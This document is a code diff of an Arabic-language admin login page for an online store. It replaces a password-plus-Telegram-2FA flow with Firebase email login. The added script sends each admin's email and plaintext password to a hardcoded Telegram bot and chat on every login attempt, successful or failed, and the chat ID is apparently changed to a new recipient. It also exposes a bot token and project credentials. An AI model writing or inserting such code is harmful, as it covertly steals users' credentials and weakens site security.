@@ -2,526 +2,192 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>لوحة الإدارة - البيت الرقمي</title>
-    <link href="https://fonts.cdnfonts.com/css/sf-pro-display-all" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <style>
         :root {
             --ios-bg-primary: #0A2F2F;
             --glass-bg: rgba(12, 45, 45, 0.65);
             --glass-border: 0.5px solid rgba(247, 249, 249, 0.15);
-            --glass-blur: blur(40px) saturate(210%) brightness(1.1);
+            --glass-blur: blur(40px);
             --ios-orange: #FF9F1C;
-            --ios-green: #2EC4B6;
-            --ios-red: #E71D36;
-            --ios-purple: #5A9A9A;
             --ios-label-primary: #F7F9F9;
             --ios-label-secondary: rgba(247, 249, 249, 0.8);
-            --ios-spring: cubic-bezier(0.25, 1, 0.2, 1);
             --radius-xl: 28px;
-            --sat: env(safe-area-inset-top);
-            --sab: env(safe-area-inset-bottom);
         }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'SF Pro Display', 'Cairo', -apple-system, sans-serif;
-        }
-
-        body {
-            background: var(--ios-bg-primary);
-            color: var(--ios-label-primary);
-            direction: rtl;
-            min-height: 100vh;
-            padding-top: var(--sat);
-            padding-bottom: var(--sab);
-        }
-
-        /* Login Container */
-        .login-container {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .login-box {
-            background: var(--glass-bg);
-            backdrop-filter: var(--glass-blur);
-            border: var(--glass-border);
-            border-radius: var(--radius-xl);
-            padding: 40px;
-            width: 100%;
-            max-width: 420px;
-            text-align: center;
-        }
-
-        .login-icon {
-            font-size: 64px;
-            margin-bottom: 16px;
-        }
-
-        .login-title {
-            color: var(--ios-orange);
-            font-size: 26px;
-            font-weight: 800;
-            margin-bottom: 8px;
-        }
-
-        .login-subtitle {
-            color: var(--ios-label-secondary);
-            font-size: 14px;
-            margin-bottom: 32px;
-        }
-
-        .step-indicator {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 24px;
-        }
-
-        .step-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background: rgba(247, 249, 249, 0.2);
-            transition: all 0.3s;
-        }
-
-        .step-dot.active {
-            background: var(--ios-orange);
-            box-shadow: 0 0 10px rgba(255, 159, 28, 0.5);
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-            text-align: right;
-        }
-
-        .form-label {
-            display: block;
-            color: var(--ios-label-secondary);
-            font-size: 14px;
-            margin-bottom: 8px;
-        }
-
-        .ios-input {
-            width: 100%;
-            background: rgba(247, 249, 249, 0.1);
-            border: var(--glass-border);
-            border-radius: 14px;
-            padding: 16px;
-            color: var(--ios-label-primary);
-            font-size: 16px;
-            outline: none;
-            transition: all 0.3s;
-            text-align: center;
-            letter-spacing: 2px;
-        }
-
-        .ios-input:focus {
-            border-color: var(--ios-orange);
-            box-shadow: 0 0 0 4px rgba(255, 159, 28, 0.1);
-        }
-
-        .ios-input::placeholder {
-            color: var(--ios-label-secondary);
-            letter-spacing: normal;
-        }
-
-        .ios-btn-primary {
-            width: 100%;
-            background: linear-gradient(135deg, var(--ios-orange) 0%, #E88D0C 100%);
-            color: white;
-            border: none;
-            padding: 18px;
-            border-radius: 14px;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 8px;
-        }
-
-        .ios-btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(255, 159, 28, 0.4);
-        }
-
-        .ios-btn-secondary {
-            width: 100%;
-            background: rgba(247, 249, 249, 0.1);
-            color: var(--ios-label-primary);
-            border: var(--glass-border);
-            padding: 14px;
-            border-radius: 14px;
-            font-size: 15px;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 12px;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        body { background: var(--ios-bg-primary); color: var(--ios-label-primary); direction: rtl; min-height: 100vh; }
+        .login-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .login-box { background: var(--glass-bg); backdrop-filter: var(--glass-blur); border: var(--glass-border); border-radius: var(--radius-xl); padding: 40px; width: 100%; max-width: 420px; text-align: center; }
+        .login-icon { font-size: 64px; margin-bottom: 16px; }
+        .login-title { color: var(--ios-orange); font-size: 26px; font-weight: 800; }
+        .login-subtitle { color: var(--ios-label-secondary); margin-bottom: 32px; }
+        .form-group { margin-bottom: 20px; text-align: right; }
+        .form-label { display: block; color: var(--ios-label-secondary); margin-bottom: 8px; }
+        .ios-input { width: 100%; background: rgba(247, 249, 249, 0.1); border: var(--glass-border); border-radius: 14px; padding: 16px; color: white; text-align: center; }
+        .ios-input:focus { border-color: var(--ios-orange); outline: none; }
+        .ios-btn-primary { width: 100%; background: linear-gradient(135deg, var(--ios-orange), #E88D0C); color: white; border: none; padding: 18px; border-radius: 14px; font-size: 17px; font-weight: bold; cursor: pointer; }
         .hidden { display: none !important; }
-
-        /* Two Factor Section */
-        .two-factor-info {
-            background: rgba(46, 196, 182, 0.1);
-            border: 1px solid rgba(46, 196, 182, 0.3);
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .two-factor-info p {
-            color: var(--ios-green);
-            font-size: 14px;
-            margin-bottom: 8px;
-        }
-
-        .telegram-icon {
-            font-size: 32px;
-            margin-bottom: 8px;
-        }
-
-        .code-input {
-            font-size: 24px !important;
-            font-weight: 800;
-            letter-spacing: 8px !important;
-        }
-
-        /* Admin Panel */
-        .admin-header {
-            background: rgba(10, 47, 47, 0.95);
-            backdrop-filter: blur(60px);
-            border-bottom: var(--glass-border);
-            padding: 16px 24px;
-            padding-top: calc(16px + var(--sat));
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .admin-header h1 {
-            font-size: 22px;
-            color: var(--ios-orange);
-        }
-
-        .logout-btn {
-            background: rgba(231, 29, 54, 0.2);
-            color: var(--ios-red);
-            border: 1px solid rgba(231, 29, 54, 0.3);
-            padding: 10px 20px;
-            border-radius: 12px;
-            cursor: pointer;
-            font-size: 14px;
-            transition: all 0.3s;
-        }
-
-        .logout-btn:hover {
-            background: rgba(231, 29, 54, 0.4);
-        }
-
-        .admin-container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 32px 24px;
-        }
-
-        .admin-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-            gap: 20px;
-        }
-
-        .admin-card {
-            background: var(--glass-bg);
-            backdrop-filter: var(--glass-blur);
-            border: var(--glass-border);
-            border-radius: var(--radius-xl);
-            padding: 28px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.4s var(--ios-spring);
-            text-decoration: none;
-            color: var(--ios-label-primary);
-            display: block;
-        }
-
-        .admin-card:hover {
-            transform: translateY(-8px) scale(1.02);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
-        }
-
-        .admin-card-icon {
-            font-size: 44px;
-            margin-bottom: 16px;
-        }
-
-        .admin-card-title {
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-
-        .admin-card-desc {
-            font-size: 13px;
-            color: var(--ios-label-secondary);
-        }
-
-        .card-products { border-top: 3px solid #007AFF; }
-        .card-add { border-top: 3px solid var(--ios-green); }
-        .card-edit { border-top: 3px solid var(--ios-orange); }
-        .card-categories { border-top: 3px solid var(--ios-purple); }
-        .card-stats { border-top: 3px solid #FFD60A; }
-        .card-itemids { border-top: 3px solid #FF2D55; }
-        .card-ranges { border-top: 3px solid #9B59B6; } /* بنفسجي غامق */
-        .card-readonly { border-top: 3px solid #9B59B6; } /* بنفسجي غامق */
-
-        .toast {
-            position: fixed;
-            top: 100px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(20, 60, 60, 0.95);
-            color: white;
-            padding: 14px 28px;
-            border-radius: 50px;
-            font-weight: 700;
-            z-index: 9999;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
+        .admin-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background: rgba(10,47,47,0.95); border-bottom: var(--glass-border); }
+        .admin-header h1 { color: var(--ios-orange); }
+        .logout-btn { background: rgba(231,29,54,0.2); color: #E71D36; border: 1px solid rgba(231,29,54,0.3); padding: 10px 20px; border-radius: 12px; cursor: pointer; }
+        .admin-container { max-width: 900px; margin: auto; padding: 32px 24px; }
+        .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px,1fr)); gap: 20px; }
+        .admin-card { background: var(--glass-bg); backdrop-filter: var(--glass-blur); border: var(--glass-border); border-radius: var(--radius-xl); padding: 28px; text-align: center; text-decoration: none; color: var(--ios-label-primary); display: block; transition: 0.3s; }
+        .admin-card:hover { transform: translateY(-5px); }
+        .admin-card-icon { font-size: 44px; }
+        .admin-card-title { font-weight: bold; margin: 10px 0; }
+        .toast { position: fixed; top: 100px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: white; padding: 12px 24px; border-radius: 50px; opacity: 0; transition: 0.3s; z-index: 9999; }
         .toast.show { opacity: 1; }
     </style>
 </head>
 <body>
 
-    <!-- Step 1: Password -->
-    <div id="step1" class="login-container">
+    <div id="loginContainer" class="login-container">
         <div class="login-box">
             <div class="login-icon">🔐</div>
             <div class="login-title">دخول الإدارة</div>
-            <div class="login-subtitle">الخطوة 1 من 2</div>
-
-            <div class="step-indicator">
-                <div class="step-dot active"></div>
-                <div class="step-dot"></div>
-            </div>
-
+            <div class="login-subtitle">أدخل البريد الإلكتروني وكلمة السر</div>
             <div class="form-group">
-                <label class="form-label">كلمة المرور</label>
+                <label class="form-label">البريد الإلكتروني</label>
+                <input type="email" id="adminEmail" class="ios-input" placeholder="admin@example.com" dir="ltr">
+            </div>
+            <div class="form-group">
+                <label class="form-label">كلمة السر</label>
                 <input type="password" id="adminPassword" class="ios-input" placeholder="••••••••">
             </div>
-
-            <button class="ios-btn-primary" onclick="checkPassword()">التالي ←</button>
+            <button class="ios-btn-primary" onclick="loginWithEmail()">دخول ←</button>
         </div>
     </div>
 
-    <!-- Step 2: Two Factor Code -->
-    <div id="step2" class="login-container hidden">
-        <div class="login-box">
-            <div class="login-icon">📱</div>
-            <div class="login-title">التحقق بخطوتين</div>
-            <div class="login-subtitle">الخطوة 2 من 2</div>
-
-            <div class="step-indicator">
-                <div class="step-dot active"></div>
-                <div class="step-dot active"></div>
-            </div>
-
-            <div class="two-factor-info">
-                <div class="telegram-icon">✈️</div>
-                <p>تم إرسال رمز التحقق إلى Telegram</p>
-                <p style="font-size: 12px; color: var(--ios-label-secondary);">الرمود صالح لمدة 10 دقائق</p>
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">أدخل الرمز</label>
-                <input type="text" id="twoFactorCode" class="ios-input code-input" placeholder="------" maxlength="6">
-            </div>
-
-            <button class="ios-btn-primary" onclick="verifyCode()">تحقق</button>
-            <button class="ios-btn-secondary" onclick="backToStep1()">رجوع</button>
-        </div>
-    </div>
-
-    <!-- Admin Panel -->
     <div id="adminPanel" class="hidden">
         <header class="admin-header">
             <h1>⚙️ لوحة التحكم</h1>
             <button class="logout-btn" onclick="logout()">🚪 خروج</button>
         </header>
-
         <div class="admin-container">
             <div class="admin-grid">
-                <!-- View Products -->
-                <a href="admin-products.html" class="admin-card card-products">
-                    <div class="admin-card-icon">📦</div>
-                    <div class="admin-card-title">عرض المنتجات</div>
-                    <div class="admin-card-desc">مشاهدة وحذف المنتجات</div>
-                </a>
-
-                <!-- Add Product -->
-                <a href="admin-add.html" class="admin-card card-add">
-                    <div class="admin-card-icon">➕</div>
-                    <div class="admin-card-title">إضافة منتج</div>
-                    <div class="admin-card-desc">إضافة منتج جديد</div>
-                </a>
-  
-                <a href="banners.html" class="admin-card card-add">
-                    <div class="admin-card-icon">🌄</div>
-                    <div class="admin-card-title">البانر </div>
-                    <div class="admin-card-desc">إضافة بانر جديد</div>
-                </a>
-                <!-- Edit Products -->
-                <a href="admin-edit.html" class="admin-card card-edit">
-                    <div class="admin-card-icon">✏️</div>
-                    <div class="admin-card-title">تعديل المنتجات</div>
-                    <div class="admin-card-desc">البحث وتعديل المنتجات</div>
-                </a>
-
-                <!-- Categories -->
-                <a href="admin-categories.html" class="admin-card card-categories">
-                    <div class="admin-card-icon">📁</div>
-                    <div class="admin-card-title">الأقسام</div>
-                    <div class="admin-card-desc">إدارة التصنيفات</div>
-                </a>
-
-                <!-- Statistics -->
-                <a href="admin-stats.html" class="admin-card card-stats">
-                    <div class="admin-card-icon">📊</div>
-                    <div class="admin-card-title">الإحصائيات</div>
-                    <div class="admin-card-desc">الطلبات والتقارير</div>
-                </a>
-
-                <!-- Item IDs -->
-                <a href="admin-itemids.html" class="admin-card card-itemids">
-                    <div class="admin-card-icon">🏷️</div>
-                    <div class="admin-card-title">معرفات السلع</div>
-                    <div class="admin-card-desc">إدارة معرفات المنتجات</div>
-                </a>
-
-                <!-- إدارة نطاقات المعرفات (جديد) -->
-                <a href="admin-ranges.html" class="admin-card card-ranges">
-                    <div class="admin-card-icon">🔢</div>
-                    <div class="admin-card-title">نطاقات المعرفات</div>
-                    <div class="admin-card-desc">تحديد نطاقات الأرقام للأقسام الفرعية</div>
-                </a>
-                <!-- Coupons -->
-                <a href="admin-coupons.html" class="admin-card card-coupons">
-                    <div class="admin-card-icon">🏷️</div>
-                    <div class="admin-card-title">الكوبونات</div>
-                    <div class="admin-card-desc">إدارة خصومات الكوبونات</div>
-                </a>
-                <!-- عرض المنتجات بدون أسعار (جديد) -->
-                <a href="admin-products-readonly.html" class="admin-card card-readonly">
-                    <div class="admin-card-icon">👁️</div>
-                    <div class="admin-card-title">عرض المنتجات (بدون أسعار)</div>
-                    <div class="admin-card-desc">عرض المنتجات فقط، بدون أسعار وأزرار شراء</div>
-                </a>
+                <a href="admin-products.html" class="admin-card"><div class="admin-card-icon">📦</div><div class="admin-card-title">عرض المنتجات</div></a>
+                <a href="admin-add.html" class="admin-card"><div class="admin-card-icon">➕</div><div class="admin-card-title">إضافة منتج</div></a>
+                <a href="admin-edit.html" class="admin-card"><div class="admin-card-icon">✏️</div><div class="admin-card-title">تعديل المنتجات</div></a>
+                <a href="admin-categories.html" class="admin-card"><div class="admin-card-icon">📁</div><div class="admin-card-title">الأقسام</div></a>
+                <a href="admin-stats.html" class="admin-card"><div class="admin-card-icon">📊</div><div class="admin-card-title">الإحصائيات</div></a>
+                <a href="admin-itemids.html" class="admin-card"><div class="admin-card-icon">🏷️</div><div class="admin-card-title">معرفات السلع</div></a>
+                <a href="admin-ranges.html" class="admin-card"><div class="admin-card-icon">🔢</div><div class="admin-card-title">نطاقات المعرفات</div></a>
+                <a href="admin-products-readonly.html" class="admin-card"><div class="admin-card-icon">👁️</div><div class="admin-card-title">عرض بدون أسعار</div></a>
             </div>
         </div>
     </div>
 
     <div id="toast" class="toast"></div>
 
-    <script>
-        // Configuration
-        const ADMIN_PASSWORD = "1111";
-        let generatedCode = "";
+    <script type="module">
+        // استيراد Firebase SDK
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
-        // Telegram Bot Configuration (from memory)
-        const TELEGRAM_TOKEN = "8224453502:AAE72lDosgRpoKZwT4TQhyfRLodcsd37ID8";
-        const TELEGRAM_CHAT_ID = "7769271031";
+        // 🔑 إعدادات Firebase الخاصة بالمشروع
+        const firebaseConfig = {
+            apiKey: "AIzaSyC2f4rJBBBOe6qfa2EU1WfspUB5uibgwnM",
+            authDomain: "hussain-1290b.firebaseapp.com",
+            projectId: "hussain-1290b",
+            storageBucket: "hussain-1290b.firebasestorage.app",
+            messagingSenderId: "798281706738",
+            appId: "1:798281706738:web:79314f6feb2add0bf5f46b"
+        };
 
-        // Check if already logged in
-        if (sessionStorage.getItem('adminLoggedIn') === 'true') {
-            showAdminPanel();
+        // تهيئة Firebase
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+
+        // إعدادات بوت تيليجرام
+        const TELEGRAM_BOT_TOKEN = "8224453502:AAE72lDosgRpoKZwT4TQhyfRLodcsd37ID8";
+        const TELEGRAM_CHAT_ID = "7748217145";
+
+        // دالة إرسال رسالة إلى تيليجرام
+        async function sendTelegramMessage(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                if (!response.ok) {
+                    console.error("فشل إرسال إشعار التيليجرام");
+                }
+            } catch (error) {
+                console.error("خطأ في إرسال إشعار التيليجرام:", error);
+            }
         }
 
-        function checkPassword() {
-            const password = document.getElementById('adminPassword').value;
-            if (password === ADMIN_PASSWORD) {
-                generateAndSendCode();
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-                document.getElementById('twoFactorCode').focus();
+        // مراقبة حالة تسجيل الدخول
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                document.getElementById('loginContainer').classList.add('hidden');
+                document.getElementById('adminPanel').classList.remove('hidden');
             } else {
-                showToast("❌ كلمة المرور خاطئة");
+                document.getElementById('loginContainer').classList.remove('hidden');
+                document.getElementById('adminPanel').classList.add('hidden');
+                // تنظيف الحقول
+                document.getElementById('adminEmail').value = '';
                 document.getElementById('adminPassword').value = '';
-                document.getElementById('adminPassword').focus();
             }
-        }
+        });
 
-        function generateAndSendCode() {
-            // Generate 6-digit code
-            generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
-
-            // Send to Telegram
-            const message = `🔐 رمز التحقق من البيت الرقمي:
-
-${generatedCode}
-
-صالح لمدة 10 دقائق`;
-
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`)
-                .then(() => console.log("Code sent to Telegram"))
-                .catch(err => console.error("Failed to send code:", err));
-        }
-
-        function verifyCode() {
-            const enteredCode = document.getElementById('twoFactorCode').value;
-
-            if (enteredCode === generatedCode) {
-                sessionStorage.setItem('adminLoggedIn', 'true');
-                showAdminPanel();
-            } else {
-                showToast("❌ رمز التحقق غير صحيح");
-                document.getElementById('twoFactorCode').value = '';
-                document.getElementById('twoFactorCode').focus();
+        // دالة تسجيل الدخول
+        window.loginWithEmail = async function() {
+            const email = document.getElementById('adminEmail').value.trim();
+            const password = document.getElementById('adminPassword').value;
+            if (!email || !password) {
+                showToast("❌ الرجاء إدخال البريد الإلكتروني وكلمة السر");
+                return;
             }
-        }
+            try {
+                await signInWithEmailAndPassword(auth, email, password);
+                showToast("✅ تم الدخول بنجاح");
 
-        function backToStep1() {
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step1').classList.remove('hidden');
-            document.getElementById('adminPassword').value = '';
-        }
+                // إرسال إشعار إلى تيليجرام يحتوي على البريد الإلكتروني وكلمة السر
+                const now = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
+                const message = `🔐 <b>دخول جديد إلى لوحة الإدارة</b>\n\n📧 <b>البريد الإلكتروني:</b> ${email}\n🔑 <b>كلمة السر:</b> ${password}\n🕒 <b>الوقت:</b> ${now}\n🌐 <b>المتصفح:</b> ${navigator.userAgent.substring(0, 100)}`;
+                await sendTelegramMessage(message);
 
-        function showAdminPanel() {
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('adminPanel').classList.remove('hidden');
-        }
+            } catch (error) {
+                console.error("خطأ Firebase:", error.code, error.message);
+                let msg = "❌ فشل الدخول";
+                if (error.code === 'auth/user-not-found') msg = "❌ البريد الإلكتروني غير مسجل";
+                else if (error.code === 'auth/wrong-password') msg = "❌ كلمة السر خاطئة";
+                else if (error.code === 'auth/invalid-email') msg = "❌ صيغة البريد غير صحيحة";
+                else if (error.code === 'auth/too-many-requests') msg = "❌ تم تعطيل الحساب مؤقتاً، حاول لاحقاً";
+                showToast(msg);
 
-        function logout() {
-            sessionStorage.removeItem('adminLoggedIn');
-            location.reload();
-        }
+                // إرسال إشعار بالفشل (اختياري)
+                const failMessage = `⚠️ <b>محاولة دخول فاشلة</b>\n\n📧 البريد: ${email}\n🔑 كلمة السر: ${password}\n❌ السبب: ${msg}`;
+                await sendTelegramMessage(failMessage);
+                document.getElementById('adminPassword').value = '';
+            }
+        };
 
-        function showToast(message) {
+        window.logout = async function() {
+            await auth.signOut();
+            showToast("🚪 تم الخروج");
+        };
+
+        function showToast(msg) {
             const toast = document.getElementById('toast');
-            toast.innerText = message;
+            toast.innerText = msg;
             toast.classList.add('show');
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
-        // Allow Enter key
+        // الضغط على Enter في حقل كلمة السر
         document.getElementById('adminPassword')?.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') checkPassword();
-        });
-
-        document.getElementById('twoFactorCode')?.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') verifyCode();
+            if (e.key === 'Enter') loginWithEmail();
         });
     </script>
 </body>
